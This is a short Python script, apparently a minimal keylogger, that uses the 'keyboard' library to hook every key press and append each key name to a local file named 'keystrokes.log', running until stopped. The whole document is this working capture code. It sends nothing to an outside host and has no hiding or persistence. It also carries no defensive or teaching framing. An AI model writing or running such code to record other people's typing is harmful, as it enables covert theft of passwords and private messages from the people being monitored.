import keyboard

keystrokes_log = "keystrokes.log"

def press_key(event):
    with open(keystrokes_log, "a") as file:
        # Each key press on new line
        file.write("{}\n".format(event.name))

        # All key presses on same line
        # file.write(event.name)

keyboard.on_press(press_key)

keyboard.wait()